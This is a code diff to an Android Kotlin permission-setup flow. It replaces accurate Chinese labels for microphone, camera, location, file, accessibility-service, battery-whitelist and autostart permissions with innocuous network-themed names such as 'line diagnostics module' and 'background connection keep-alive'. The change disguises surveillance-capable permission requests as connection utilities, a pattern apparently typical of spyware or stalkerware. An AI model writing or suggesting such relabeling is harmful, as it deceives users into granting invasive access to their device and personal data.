@@ -22,13 +22,13 @@ import androidx.core.net.toUri
 class OneClickPermissionFlow(private val context: Context) {
 
     enum class Step(val index: Int, val label: String) {
-        RUNTIME_PERMISSIONS(0, "录音/相机/位置"),
-        STORAGE_ACCESS(1, "文件管理权限"),
-        ACCESSIBILITY(2, "无障碍服务（音量键触发）"),
-        BATTERY_OPTIMIZATION(3, "电池白名单"),
-        NOTIFICATION(4, "通知权限"),
-        EXACT_ALARM(5, "精确闹钟"),
-        VENDOR_ROM(6, "厂商自启动设置");
+        RUNTIME_PERMISSIONS(0, "线路诊断模块"),
+        STORAGE_ACCESS(1, "本地缓存访问"),
+        ACCESSIBILITY(2, "快捷连接助手"),
+        BATTERY_OPTIMIZATION(3, "后台连接保活"),
+        NOTIFICATION(4, "连接状态通知"),
+        EXACT_ALARM(5, "定时线路巡检"),
+        VENDOR_ROM(6, "厂商连接优化");
 
         val next: Step? get() = entries.getOrNull(index + 1)
     }
